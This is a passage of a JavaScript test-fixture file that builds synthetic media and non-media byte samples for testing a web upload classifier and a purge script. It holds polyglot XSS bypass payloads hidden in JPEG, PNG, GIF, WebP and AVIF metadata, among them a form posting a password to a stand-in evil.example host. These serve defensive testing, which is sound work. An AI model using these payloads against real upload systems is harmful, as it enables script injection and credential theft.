// Shared fixtures for the upload classifier tests (S-uploads2a, 2026-09-26).
//
// test-upload-classifier-parity-pure.cjs runs every fixture through both
// cloudflare/src/lib/uploadSecurity.ts and the owner-run
// ops/scripts/purge-non-media-uploads.mjs and requires the same verdict;
// test-purge-non-media-uploads-pure.cjs checks the purge's decision for each.
//
// A catalogue entry names the object key it is stored under, the format the
// Worker detects (`worker`: a MIME type, or null when the upload allowlist
// refuses it), whether the Worker finds embedded markup (`markup`, only where
// it matters) and the purge group it must land in (`group`, see GROUPS in the
// purge script). The refuter's probes against the first purge are here by
// name: .jfif/.jpe/blob-*.bin JPEGs, an extensionless PNG, an .m4v, and
// QuickTime movies that start with a wide/mdat/moov/free/skip atom.
'use strict'

const enc = (text) => new TextEncoder().encode(text)
const bytes = (...parts) => {
  const arrays = parts.map((part) => (typeof part === 'string' ? enc(part) : part instanceof Uint8Array ? part : Uint8Array.from(part)))
  const out = new Uint8Array(arrays.reduce((sum, a) => sum + a.length, 0))
  let offset = 0
  for (const a of arrays) { out.set(a, offset); offset += a.length }
  return out
}
const latin1 = (text) => Uint8Array.from(text, (char) => char.charCodeAt(0) & 0xff)
const utf16le = (text) => new Uint8Array(Buffer.from(text, 'utf16le'))
const utf16be = (text) => { const le = utf16le(text); const be = new Uint8Array(le.length); for (let i = 0; i < le.length; i += 2) { be[i] = le[i + 1]; be[i + 1] = le[i] } return be }
const u16be = (n) => [(n >> 8) & 0xff, n & 0xff]
const u16le = (n) => [n & 0xff, (n >> 8) & 0xff]
const u32be = (n) => [(n >>> 24) & 0xff, (n >>> 16) & 0xff, (n >>> 8) & 0xff, n & 0xff]
const u32le = (n) => [n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff]

function mulberry32(seed) {
  return function next() {
    seed = (seed + 0x6d2b79f5) | 0
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
function randomBytes(rng, length) {
  const out = new Uint8Array(length)
  for (let index = 0; index < length; index += 1) out[index] = (rng() * 256) | 0
  return out
}

// ------------------------------------------------------------ images
const jpegSegment = (marker, payload) => bytes([0xff, marker, ...u16be(payload.length + 2)], payload)
// Entropy-coded data as an encoder writes it: 0xFF stuffed with 0x00.
function entropyCoded(raw) {
  const out = new Uint8Array(raw.length * 2 + 16)
  let length = 0
  for (let index = 0; index < raw.length; index += 1) {
    out[length++] = raw[index]
    if (raw[index] === 0xff) out[length++] = 0x00
  }
  return out.subarray(0, length)
}
const JFIF_APP0 = jpegSegment(0xe0, bytes('JFIF\0', [1, 1, 0, 0, 72, 0, 72, 0, 0]))
function jpeg({ segments = [], scan, trailer = new Uint8Array(0), rng = mulberry32(1) } = {}) {
  return bytes(
    [0xff, 0xd8], JFIF_APP0, ...segments,
    jpegSegment(0xdb, bytes([0], randomBytes(rng, 64))),
    jpegSegment(0xc0, bytes([8, 0, 16, 0, 16, 3, 1, 0x22, 0, 2, 0x11, 1, 3, 0x11, 1])),
    jpegSegment(0xc4, bytes([0], randomBytes(rng, 28))),
    jpegSegment(0xda, bytes([3, 1, 0, 2, 0x11, 3, 0x11, 0, 0x3f, 0])),
    entropyCoded(scan || randomBytes(rng, 2048)),
    [0xff, 0xd9], trailer,
  )
}
const comSegment = (payload) => jpegSegment(0xfe, typeof payload === 'string' ? enc(payload) : payload)
// Neutral APP2 data so a later segment lies past the 1445-byte sniff window.
const APP_PADDING = jpegSegment(0xe2, bytes('ICC_PROFILE\0', [1, 1], new Uint8Array(2048).fill(0x11)))

const PNG_SIG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]
const pngChunk = (type, data) => bytes(u32be(data.length), type, data, [0, 0, 0, 0])
const png = (...chunks) => bytes(PNG_SIG, pngChunk('IHDR', bytes(u32be(16), u32be(16), [8, 2, 0, 0, 0])), ...chunks, pngChunk('IEND', new Uint8Array(0)))

function gifSubBlocks(data) {
  const parts = []
  for (let index = 0; index < data.length; index += 255) {
    const block = data.subarray(index, index + 255)
    parts.push(bytes([block.length], block))
  }
  return bytes(...parts, [0])
}
function gif({ lzw, extensions = [], rng = mulberry32(2) } = {}) {
  return bytes('GIF89a', [16, 0, 16, 0, 0xf7, 0, 0], randomBytes(rng, 768), ...extensions,
    [0x21, 0xf9, 4, 0, 0, 0, 0, 0],
    [0x2c, 0, 0, 0, 0, 16, 0, 16, 0, 0], [8], gifSubBlocks(lzw || randomBytes(rng, 2048)), [0x3b])
}

const webpChunk = (fourcc, data) => bytes(fourcc, u32le(data.length), data, data.length % 2 ? [0] : [])
function webp(...chunks) {
  const body = bytes('WEBP', ...chunks)
  return bytes('RIFF', u32le(body.length), body)
}

const isoBox = (type, data) => bytes(u32be(data.length + 8), type, data)
const ftyp = (major, ...compatible) => isoBox('ftyp', bytes(major, [0, 0, 0, 0], ...compatible))
const MOOV = isoBox('moov', isoBox('mvhd', new Uint8Array(100)))
const MDAT = isoBox('mdat', randomBytes(mulberry32(8), 600))
const META = isoBox('meta', new Uint8Array(40))
const avif = (meta, mdat) => bytes(ftyp('avif', 'mif1', 'miaf'), isoBox('meta', meta), isoBox('mdat', mdat))

// C2PA Content Credentials: a JUMBF superbox whose tool icon is an SVG.
const C2PA_UUID = [0xd8, 0xfe, 0xc3, 0xd6, 0x1b, 0x0e, 0x48, 0x3c, 0x92, 0x97, 0x58, 0x28, 0x87, 0x7e, 0xc4, 0x81]
const ICON_SVG = '<svg width="716" height="716" viewBox="0 0 716 716" fill="none" xmlns="http://www.w3.org/2000/svg">\n<path d="M508.7 317.4C516.8 287.3 509 253.9 485.4 230.3Z" fill="black"/>\n</svg>'
function jumbf(icon, rng = mulberry32(11)) {
  const description = isoBox('jumd', bytes([0x63, 0x32, 0x70, 0x61, 0, 0x11, 0, 0x10, 0x80, 0, 0, 0xaa, 0, 0x38, 0x9b, 0x71], 'c2pa\0'))
  const iconBoxes = bytes(isoBox('bfdb', bytes([0], 'image/svg+xml\0')), isoBox('bidb', typeof icon === 'string' ? enc(icon) : icon))
  return isoBox('jumb', bytes(description, iconBoxes, isoBox('bidb', entropyCoded(randomBytes(rng, 3000)))))
}
function c2paCarriers() {
  return [
    ['PNG caBX chunk', (icon) => png(pngChunk('caBX', jumbf(icon)), pngChunk('IDAT', randomBytes(mulberry32(12), 3000)))],
    ['JPEG APP11 JUMBF', (icon) => jpeg({ segments: [jpegSegment(0xeb, bytes('JP', [0, 1, 0, 0, 0, 1], jumbf(icon)))] })],
    ['WebP C2PA chunk', (icon) => webp(webpChunk('VP8X', new Uint8Array(10)), webpChunk('C2PA', jumbf(icon)), webpChunk('VP8 ', randomBytes(mulberry32(13), 3000)))],
    ['AVIF uuid box', (icon) => bytes(ftyp('avif', 'mif1', 'miaf'), isoBox('meta', new Uint8Array(60)), isoBox('uuid', bytes(C2PA_UUID, [0, 0, 0, 0], 'manifest\0', jumbf(icon))), isoBox('mdat', randomBytes(mulberry32(14), 3000)))],
  ]
}
const C2PA_ICONS = [
  ['inert SVG tool icon', ICON_SVG, false],
  ['<svg onload>', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><path d="M0 0"/></svg>', true],
  ['<script> in the icon', '<svg><script>alert(1)</script></svg>', true],
  ['UTF-16 onload', utf16le('<svg onload=alert(1)>'), true],
]

// The refuter's polyglot bypasses (S-uploads2a fix 3) and the carriers
// they hid in.
const BYPASSES = [
  ['<script + form feed', enc('<script\f>alert(document.domain)</script>')],
  ['<svg + NUL', enc('<svg\0onload=alert(1)>')],
  ['UTF-16LE <script>', utf16le('<script>alert(1)</script>')],
  ['UTF-16BE <script>', utf16be('<script>alert(1)</script>')],
  ['<style>', enc('<style>@import url(https://evil.example/x.css)</style>')],
  ['<form>', enc('<form action=https://evil.example/steal method=post><input name=password></form>')],
  ['<a href=', enc('<a href=//evil.example>continue</a>')],
  ['<a/href', enc('<a/href="//evil.example">x</a>')],
  ['<link rel=stylesheet', enc('<link rel=stylesheet href=//evil.example/x.css>')],
  ['<base href', enc('<base href=//evil.example/>')],
  ['<frameset>', enc('<frameset><frame src=//evil.example></frameset>')],
  ['<applet', enc('<applet code=x.class>')],
  ['<math>', enc('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>')],
  ['<!DOCTYPE\\nhtml', enc('<!DOCTYPE\nhtml><p>x')],
  ['UTF-16LE <svg/onload>', utf16le('<svg/onload=alert(1)>')],
]
function bypassCarriers(payload) {
  return [
    ['JPEG COM segment past the sniff window', jpeg({ segments: [APP_PADDING, comSegment(payload)] })],
    ['JPEG EXIF segment', jpeg({ segments: [jpegSegment(0xe1, bytes('Exif\0\0MM\0*', [0, 0, 0, 8], payload))] })],
    ['JPEG head', jpeg({ segments: [comSegment(payload)] })],
    ['after the JPEG end marker', jpeg({ segments: [APP_PADDING], trailer: payload })],
    ['PNG tEXt chunk', png(pngChunk('tEXt', bytes('Comment\0', payload)), pngChunk('IDAT', randomBytes(mulberry32(3), 3000)))],
    ['GIF comment extension', gif({ extensions: [bytes([0x21, 0xfe], gifSubBlocks(payload))] })],
    ['WebP XMP chunk', webp(webpChunk('VP8 ', randomBytes(mulberry32(4), 3000)), webpChunk('XMP ', payload))],
    ['AVIF meta box', avif(bytes(new Uint8Array(1600), payload), randomBytes(mulberry32(5), 3000))],
  ]
}

// ISO brands and classic QuickTime atoms (fix 3), with the Worker's verdict.
function brandCases() {
  return [
    ['M4A audio', bytes(ftyp('M4A ', 'M4A ', 'mp42', 'isom'), MOOV, MDAT), null],
    ['M4B audiobook', bytes(ftyp('M4B ', 'M4B ', 'mp42', 'isom'), MOOV, MDAT), null],
    ['Canon CR3 raw photo', bytes(ftyp('crx ', 'crx ', 'isom'), MOOV, MDAT), null],
    ['unknown brand', bytes(ftyp('abcd', 'abcd'), MOOV, MDAT), null],
    ['HEIC', bytes(ftyp('heic', 'mif1', 'heic'), META, MDAT), null],
    ['HEIF mif1 + heic', bytes(ftyp('mif1', 'mif1', 'heic'), META, MDAT), null],
    ['HEIF mif1 + avif + heic', bytes(ftyp('mif1', 'mif1', 'avif', 'heic'), META, MDAT), null],
    ['HEIF msf1 sequence + hevc', bytes(ftyp('msf1', 'msf1', 'hevc'), MOOV, MDAT), null],
    ['mif1-major AVIF', bytes(ftyp('mif1', 'mif1', 'avif', 'miaf'), META, MDAT), 'image/avif'],
    ['msf1-major AVIF sequence', bytes(ftyp('msf1', 'msf1', 'avis', 'iso8'), MOOV, MDAT), 'image/avif'],
    ['avif major', bytes(ftyp('avif', 'mif1', 'miaf'), META, MDAT), 'image/avif'],
    ['isom', bytes(ftyp('isom', 'isom', 'iso2', 'avc1', 'mp41'), MOOV, MDAT), 'video/mp4'],
    ['mp42 (phones)', bytes(ftyp('mp42', 'mp42', 'isom'), MOOV, MDAT), 'video/mp4'],
    ['M4V (Apple)', bytes(ftyp('M4V ', 'M4V ', 'M4A ', 'mp42', 'isom'), MOOV, MDAT), 'video/mp4'],
    ['3gp4', bytes(ftyp('3gp4', '3gp4', 'isom'), MOOV, MDAT), 'video/mp4'],
    ['qt (iPhone)', bytes(ftyp('qt  ', 'qt  '), isoBox('wide', new Uint8Array(0)), MDAT, MOOV), 'video/quicktime'],
    ['QuickTime wide + mdat', quickTime('wide'), 'video/quicktime'],
    ['QuickTime mdat first', quickTime('mdat'), 'video/quicktime'],
    ['QuickTime moov first', quickTime('moov'), 'video/quicktime'],
    ['QuickTime free + moov', quickTime('free'), 'video/quicktime'],
    ['QuickTime skip + mdat (64-bit size)', quickTime('skip'), 'video/quicktime'],
    ['QuickTime pnot + PICT + moov', bytes(isoBox('pnot', new Uint8Array(12)), isoBox('PICT', new Uint8Array(64)), MOOV, MDAT), 'video/quicktime'],
    ['QuickTime head of a large file', bytes(isoBox('wide', new Uint8Array(0)), u32be(50 * 1024 * 1024), 'mdat', randomBytes(mulberry32(10), 4000)), 'video/quicktime'],
    ['free atom alone', isoBox('free', new Uint8Array(40)), null],
    ['text whose bytes 4-8 spell mdat', enc('Somemdat, a note about the shop, not a movie\n'), null],
    ['broken atom chain (size 3)', bytes(isoBox('wide', new Uint8Array(0)), [0, 0, 0, 3], 'mdat', new Uint8Array(20)), null],
  ]
}
// A classic QuickTime movie (no ftyp) that starts with the given atom.
function quickTime(first) {
  if (first === 'wide') return bytes(isoBox('wide', new Uint8Array(0)), MDAT, MOOV)
  if (first === 'mdat') return bytes(MDAT, MOOV)
  if (first === 'moov') return bytes(MOOV, MDAT)
  if (first === 'free') return bytes(isoBox('free', new Uint8Array(24)), MOOV, MDAT)
  if (first === 'skip') return bytes(isoBox('skip', new Uint8Array(8)), [0, 0, 0, 1], 'mdat', u32be(0), u32be(16 + 600), randomBytes(mulberry32(9), 600))
  throw new Error(`no QuickTime fixture for ${first}`)
}

// ------------------------------------------------ other media formats
const bmp = () => bytes('BM', u32le(54 + 48), [0, 0, 0, 0], u32le(54), u32le(40), u32le(4), u32le(4), u16le(1), u16le(24), u32le(0), u32le(48), u32le(2835), u32le(2835), u32le(0), u32le(0), randomBytes(mulberry32(21), 48))
const tiffLe = () => bytes('II*\0', u32le(8), u16le(1), u16le(256), u16le(3), u32le(1), u16le(16), [0, 0], u32le(0), randomBytes(mulberry32(22), 64))
const tiffBe = () => bytes('MM\0*', u32be(8), u16be(1), u16be(256), u16be(3), u32be(1), u16be(16), [0, 0], u32be(0), randomBytes(mulberry32(23), 64))
const heic = () => bytes(ftyp('heic', 'mif1', 'heic'), META, MDAT)
const heifMif1 = () => bytes(ftyp('mif1', 'mif1', 'heic'), META, MDAT)
const mp3 = () => bytes('ID3', [3, 0, 0, 0, 0, 0, 10], 'TIT2', [0, 0, 0, 2, 0, 0, 0, 0x41], [0xff, 0xfb, 0x90, 0x64], randomBytes(mulberry32(24), 400))
const mp3Frames = () => bytes([0xff, 0xfb, 0x90, 0x64], randomBytes(mulberry32(25), 413), [0xff, 0xfb, 0x90, 0x64], randomBytes(mulberry32(26), 413))
const riff = (form, ...chunks) => { const body = bytes(form, ...chunks); return bytes('RIFF', u32le(body.length), body) }
const avi = () => riff('AVI ', 'LIST', u32le(4), 'hdrl', 'JUNK', u32le(16), new Uint8Array(16))
const wav = () => riff('WAVE', 'fmt ', u32le(16), u16le(1), u16le(2), u32le(44100), u32le(176400), u16le(4), u16le(16), 'data', u32le(64), randomBytes(mulberry32(27), 64))
const mpegPs = () => bytes([0, 0, 1, 0xba, 0x44, 0, 4, 0, 4, 1, 1, 0x89, 0xc3, 0xf8], [0, 0, 1, 0xe0, 0, 64], randomBytes(mulberry32(28), 64))
const ogg = () => bytes('OggS', [0, 2], new Uint8Array(8), u32le(1), u32le(0), u32le(0), [1, 30], [1], 'vorbis', randomBytes(mulberry32(29), 23))
const flac = () => bytes('fLaC', [0, 0, 0, 34], randomBytes(mulberry32(30), 34))
const psd = () => bytes('8BPS', u16be(1), new Uint8Array(6), u16be(3), u32be(16), u32be(16), u16be(8), u16be(3), new Uint8Array(64))
const ico = () => bytes([0, 0, 1, 0], u16le(1), [16, 16, 0, 0], u16le(1), u16le(32), u32le(70), u32le(22), png())
const cr3 = () => bytes(ftyp('crx ', 'crx ', 'isom'), MOOV, MDAT)
const m4a = () => bytes(ftyp('M4A ', 'M4A ', 'mp42', 'isom'), MOOV, MDAT)

// ------------------------------------------------ non-media formats
const pdf = () => bytes('%PDF-1.7\n%', [0xe2, 0xe3, 0xcf, 0xd3], '\n1 0 obj\n<< /Type /Catalog >>\nendobj\n', [0, 1, 2, 0xff], '\n%%EOF\n')
function zipEntry(name, data, method = 0) {
  return bytes([0x50, 0x4b, 3, 4], u16le(20), u16le(0), u16le(method), u16le(0), u16le(0), u32le(0), u32le(data.length), u32le(data.length), u16le(name.length), u16le(0), name, data)
}
const zip = () => bytes(zipEntry('photos/a.jpg', jpeg()), [0x50, 0x4b, 5, 6], new Uint8Array(18))
const xlsx = () => bytes(zipEntry('[Content_Types].xml', enc('<?xml version="1.0"?><Types/>'), 8), zipEntry('xl/workbook.xml', enc('<workbook/>'), 8))
const odt = () => bytes(zipEntry('mimetype', enc('application/vnd.oasis.opendocument.text')), zipEntry('content.xml', enc('<office:document-content/>'), 8))
const ora = () => bytes(zipEntry('mimetype', enc('image/openraster')), zipEntry('stack.xml', enc('<image/>'), 8))
const ole2 = () => bytes([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1], new Uint8Array(16), u16le(0x3e), u16le(3), u16le(0xfffe), u16le(9), randomBytes(mulberry32(31), 480))
const gzip = () => bytes([0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3], randomBytes(mulberry32(32), 200))
const sevenZip = () => bytes([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0, 4], randomBytes(mulberry32(33), 200))
const rar = () => bytes('Rar!', [0x1a, 7, 1, 0], randomBytes(mulberry32(34), 200))
function exe() {
  const out = new Uint8Array(512)
  out.set(enc('MZ'), 0)
  out.set(u32le(0x80), 0x3c)
  out.set(enc('PE\0\0'), 0x80)
  out.set(randomBytes(mulberry32(35), 200), 0x100)
  return out
}
const elf = () => bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0], new Uint8Array(8), randomBytes(mulberry32(36), 200))
const woff2 = () => bytes('wOF2', [0, 1, 0, 0], u32be(300), u16be(10), new Uint8Array(30), randomBytes(mulberry32(37), 200))
const html = () => enc('<!doctype html><html><body><script>alert(1)</script></body></html>\n')
const svg = () => enc('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')
const svgProlog = () => enc('<?xml version="1.0" encoding="UTF-8"?>\n<!-- Generator: Adobe Illustrator -->\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><path d="M0 0"/></svg>\n')

// --------------------------------------------------------- catalogue
// group ids: images, videos, unusual-name, misleading-name, other-images,
// other-video-audio, running-import (kept); image-with-code, compressed,
// unrecognised, empty (review, kept); documents, web-pages, text, archives,
// programs (purge candidates).
function catalogue() {
  const JPEG = jpeg()
  const PNG = png(pngChunk('IDAT', randomBytes(mulberry32(40), 900)))
  const MP4 = bytes(ftyp('isom', 'isom', 'iso2', 'avc1', 'mp41'), MOOV, MDAT)
  const M4V = bytes(ftyp('M4V ', 'M4V ', 'M4A ', 'mp42', 'isom'), MOOV, MDAT)
  const pixelMotionPhoto = jpeg({ trailer: bytes(ftyp('isom', 'isom'), isoBox('mdat', randomBytes(mulberry32(41), 3000)), MOOV) })
  const entries = [
    // Allowed images and videos: kept whatever the name (refuter probes).
    { name: 'JPEG', key: 'uploads/photo.jpg', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'images' },
    { name: 'JPEG named .JPEG', key: 'uploads/photo2.JPEG', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'images' },
    { name: 'probe: JPEG named .jfif', key: 'uploads/photo.jfif', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'unusual-name' },
    { name: 'probe: JPEG named .jpe', key: 'uploads/photo.jpe', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'unusual-name' },
    { name: 'probe: JPEG named blob-*.bin', key: 'uploads/blob-1727337600000.bin', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'unusual-name' },
    { name: 'probe: PNG with no extension', key: 'uploads/noext', bytes: PNG, worker: 'image/png', markup: false, group: 'unusual-name' },
    { name: 'PNG', key: 'uploads/logo.png', bytes: PNG, worker: 'image/png', markup: false, group: 'images' },
    { name: 'GIF', key: 'uploads/anim.gif', bytes: gif(), worker: 'image/gif', markup: false, group: 'images' },
    { name: 'WebP', key: 'uploads/pic.webp', bytes: webp(webpChunk('VP8 ', randomBytes(mulberry32(42), 900))), worker: 'image/webp', markup: false, group: 'images' },
    { name: 'AVIF', key: 'uploads/pic.avif', bytes: avif(new Uint8Array(40), randomBytes(mulberry32(43), 900)), worker: 'image/avif', markup: false, group: 'images' },
    { name: 'AVIF with a mif1 major brand', key: 'uploads/pic2.avif', bytes: bytes(ftyp('mif1', 'mif1', 'avif', 'miaf'), META, MDAT), worker: 'image/avif', markup: false, group: 'images' },
    { name: 'JPEG motion photo (Pixel)', key: 'uploads/PXL_20260926.MP.jpg', bytes: pixelMotionPhoto, worker: 'image/jpeg', markup: false, group: 'images' },
    { name: 'PNG with a C2PA manifest and its SVG tool icon', key: 'uploads/ai-logo.png', bytes: c2paCarriers()[0][1](ICON_SVG), worker: 'image/png', markup: false, group: 'images' },
    { name: 'MP4', key: 'uploads/clip.mp4', bytes: MP4, worker: 'video/mp4', markup: false, group: 'videos' },
    { name: 'probe: M4V named .m4v', key: 'uploads/clip.m4v', bytes: M4V, worker: 'video/mp4', markup: false, group: 'unusual-name' },
    { name: 'MOV (qt brand)', key: 'uploads/iphone.mov', bytes: bytes(ftyp('qt  ', 'qt  '), isoBox('wide', new Uint8Array(0)), MDAT, MOOV), worker: 'video/quicktime', markup: false, group: 'videos' },
    ...['wide', 'mdat', 'moov', 'free', 'skip'].map((atom) => ({
      name: `probe: QuickTime .mov starting with a ${atom} atom`, key: `uploads/old-${atom}.mov`, bytes: quickTime(atom), worker: 'video/quicktime', markup: false, group: 'videos',
    })),
    { name: 'WebM', key: 'uploads/clip.webm', bytes: bytes([0x1a, 0x45, 0xdf, 0xa3], [0x9f, 0x42, 0x86, 0x81, 1], 'B', [0x82, 0x84], 'webm', randomBytes(mulberry32(44), 300)), worker: 'video/webm', markup: false, group: 'videos' },
    // Media under a name that claims something else: kept, listed.
    { name: 'PNG named .html', key: 'uploads/evil.html', bytes: PNG, worker: 'image/png', markup: false, group: 'misleading-name' },
    { name: 'JPEG named .svg', key: 'uploads/logo.svg', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'misleading-name' },
    { name: 'MP4 named .pdf', key: 'private/library/scan.pdf', bytes: MP4, worker: 'video/mp4', markup: false, group: 'misleading-name' },
    { name: 'HEIC named .js', key: 'uploads/IMG_0004.js', bytes: heic(), worker: null, group: 'misleading-name' },
    // Import files: bytes decide, except for imports still running.
    { name: 'JPEG under imports/ of a finished job', key: 'imports/done-job/incoming/p.jpg', bytes: JPEG, worker: 'image/jpeg', markup: false, group: 'images' },
    { name: 'CSV under imports/ of a running job', key: 'imports/live-job/incoming/items.csv', bytes: enc('name,price\nSerum,1\n'), worker: null, group: 'running-import' },
    { name: 'ZIP under imports/ of a running job', key: 'imports/live-job/incoming/images.zip', bytes: zip(), worker: null, group: 'running-import' },
    // Real photos, video and audio the upload list no longer takes: kept.
    { name: 'HEIC (ftyp heic)', key: 'uploads/IMG_0001.HEIC', bytes: heic(), worker: null, group: 'other-images' },
    { name: 'HEIF (ftyp mif1 + heic)', key: 'uploads/IMG_0002.heif', bytes: heifMif1(), worker: null, group: 'other-images' },
    { name: 'HEIC named .jpg', key: 'uploads/IMG_0003.jpg', bytes: heic(), worker: null, group: 'other-images' },
    { name: 'BMP', key: 'uploads/scan.bmp', bytes: bmp(), worker: null, group: 'other-images' },
    { name: 'TIFF little-endian (II*)', key: 'uploads/scan.tif', bytes: tiffLe(), worker: null, group: 'other-images' },
    { name: 'TIFF big-endian (MM*)', key: 'uploads/scan2.tiff', bytes: tiffBe(), worker: null, group: 'other-images' },
    { name: 'Canon CR3 raw', key: 'uploads/IMG_1.CR3', bytes: cr3(), worker: null, group: 'other-images' },
    { name: 'Photoshop PSD', key: 'uploads/banner.psd', bytes: psd(), worker: null, group: 'other-images' },
    { name: 'ICO icon', key: 'uploads/favicon.ico', bytes: ico(), worker: null, group: 'other-images' },
    { name: 'OpenRaster (ZIP with an image/ mimetype)', key: 'uploads/drawing.ora', bytes: ora(), worker: null, group: 'other-images' },
    { name: 'M4A audio', key: 'uploads/voice.m4a', bytes: m4a(), worker: null, group: 'other-video-audio' },
    { name: 'MP3 with an ID3 tag', key: 'uploads/song.mp3', bytes: mp3(), worker: null, group: 'other-video-audio' },
    { name: 'MP3 frames, no tag', key: 'uploads/song2.mp3', bytes: mp3Frames(), worker: null, group: 'other-video-audio' },
    { name: 'AVI', key: 'uploads/old.avi', bytes: avi(), worker: null, group: 'other-video-audio' },
    { name: 'WAV', key: 'uploads/voice.wav', bytes: wav(), worker: null, group: 'other-video-audio' },
    { name: 'MPEG program stream', key: 'uploads/old.mpg', bytes: mpegPs(), worker: null, group: 'other-video-audio' },
    { name: 'Ogg', key: 'uploads/voice.ogg', bytes: ogg(), worker: null, group: 'other-video-audio' },
    { name: 'FLAC', key: 'uploads/song.flac', bytes: flac(), worker: null, group: 'other-video-audio' },
    { name: 'a lone free atom (QuickTime-like)', key: 'uploads/partial.mov', bytes: isoBox('free', new Uint8Array(40)), worker: null, group: 'other-video-audio' },
    // Review: kept, listed, never moved.
    { name: 'polyglot: JPEG with <script> in a COM segment', key: 'uploads/poly.jpg', bytes: jpeg({ segments: [APP_PADDING, comSegment('<script>alert(1)</script>')] }), worker: 'image/jpeg', markup: true, group: 'image-with-code' },
    { name: 'polyglot: PNG with <svg onload> in tEXt', key: 'uploads/poly.png', bytes: png(pngChunk('tEXt', enc('Comment\0<svg onload=alert(1)>'))), worker: 'image/png', markup: true, group: 'image-with-code' },
    { name: 'random binary', key: 'uploads/blob.dat', bytes: randomBytes(mulberry32(45), 3000), worker: null, group: 'unrecognised' },
    { name: 'JPEG missing its first byte', key: 'uploads/cut.jpg', bytes: JPEG.subarray(1), worker: null, group: 'unrecognised' },
    { name: 'UTF-16 text without a BOM', key: 'uploads/notes.txt', bytes: utf16le('name\tprice\r\nSerum\t1\r\n'), worker: null, group: 'unrecognised' },
    { name: 'text with a NUL byte', key: 'uploads/odd.txt', bytes: enc('name,price\nSerum,1\0\n'), worker: null, group: 'unrecognised' },
    { name: 'empty file', key: 'uploads/empty.jpg', bytes: new Uint8Array(0), worker: null, group: 'empty' },
    // Purge candidates: bytes positively recognised as not media.
    { name: 'PDF', key: 'uploads/invoice.pdf', bytes: pdf(), worker: null, group: 'documents' },
    { name: 'PDF named .jpg', key: 'uploads/invoice.jpg', bytes: pdf(), worker: null, group: 'documents' },
    { name: 'PDF under private/library/', key: 'private/library/r.pdf', bytes: pdf(), worker: null, group: 'documents' },
    { name: 'Word/Excel 97-2003 (OLE2)', key: 'uploads/old.xls', bytes: ole2(), worker: null, group: 'documents' },
    { name: 'XLSX', key: 'uploads/stock.xlsx', bytes: xlsx(), worker: null, group: 'documents' },
    { name: 'OpenDocument text', key: 'uploads/letter.odt', bytes: odt(), worker: null, group: 'documents' },
    { name: 'RTF', key: 'uploads/letter.rtf', bytes: enc('{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Arial;}} Hello}\n'), worker: null, group: 'documents' },
    { name: 'PostScript', key: 'uploads/logo.eps', bytes: enc('%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 10 10\n'), worker: null, group: 'documents' },
    { name: 'HTML', key: 'uploads/page.html', bytes: html(), worker: null, group: 'web-pages' },
    { name: 'HTML named .png', key: 'uploads/fake.png', bytes: html(), worker: null, group: 'web-pages' },
    { name: 'HTML followed by binary bytes', key: 'uploads/page2.htm', bytes: bytes('<!DOCTYPE html>\n<html><body>', [0, 1, 2, 3, 0xff, 0xfe], '</body></html>'), worker: null, group: 'web-pages' },
    { name: 'UTF-16LE HTML with a BOM', key: 'uploads/page3.html', bytes: bytes([0xff, 0xfe], utf16le('<html><body>x</body></html>')), worker: null, group: 'web-pages' },
    { name: 'SVG', key: 'uploads/icon.svg', bytes: svg(), worker: null, group: 'web-pages' },
    { name: 'SVG with an XML prolog', key: 'uploads/icon2.svg', bytes: svgProlog(), worker: null, group: 'web-pages' },
    { name: 'XML', key: 'uploads/feed.xml', bytes: enc('<?xml version="1.0"?>\n<rss version="2.0"><channel/></rss>\n'), worker: null, group: 'web-pages' },
    { name: 'CSV', key: 'uploads/stock.csv', bytes: enc('name,price\r\nSerum,1\r\n'), worker: null, group: 'text' },
    { name: 'CSV with a UTF-8 BOM, in Khmer', key: 'uploads/stock-km.csv', bytes: bytes([0xef, 0xbb, 0xbf], 'ឈ្មោះ,តម្លៃ\nសេរ៉ូម,១\n'), worker: null, group: 'text' },
    { name: 'UTF-16LE text with a BOM (Excel "Unicode text")', key: 'uploads/stock.txt', bytes: bytes([0xff, 0xfe], utf16le('name\tprice\r\nSerum\t1\r\n')), worker: null, group: 'text' },
    { name: 'Windows-1252 CSV', key: 'uploads/fr.csv', bytes: latin1('nom,prix\r\nCrème café,1\r\nSérum,2\r\n'), worker: null, group: 'text' },
    { name: 'JSON', key: 'uploads/data.json', bytes: enc('{"a":[1,2,3]}\n'), worker: null, group: 'text' },
    { name: 'JavaScript', key: 'uploads/app.js', bytes: enc('document.write("x")\nfunction f() { return 1 }\n'), worker: null, group: 'text' },
    { name: 'text named .mov', key: 'uploads/clip.mov', bytes: enc('This is not a movie.\n'), worker: null, group: 'text' },
    { name: 'text whose bytes 4-8 spell mdat', key: 'uploads/note.txt', bytes: enc('Somemdat, a note about the shop, not a movie\n'), worker: null, group: 'text' },
    { name: 'ZIP', key: 'uploads/x.zip', bytes: zip(), worker: null, group: 'archives' },
    { name: 'ZIP under imports/ of a finished job', key: 'imports/done-job/incoming/images.zip', bytes: zip(), worker: null, group: 'archives' },
    { name: 'CSV under imports/ of a finished job', key: 'imports/done-job/incoming/items.csv', bytes: enc('name,price\nSerum,1\n'), worker: null, group: 'text' },
    { name: 'gzip', key: 'uploads/backup.gz', bytes: gzip(), worker: null, group: 'archives' },
    { name: '7z', key: 'uploads/backup.7z', bytes: sevenZip(), worker: null, group: 'archives' },
    { name: 'RAR', key: 'uploads/backup.rar', bytes: rar(), worker: null, group: 'archives' },
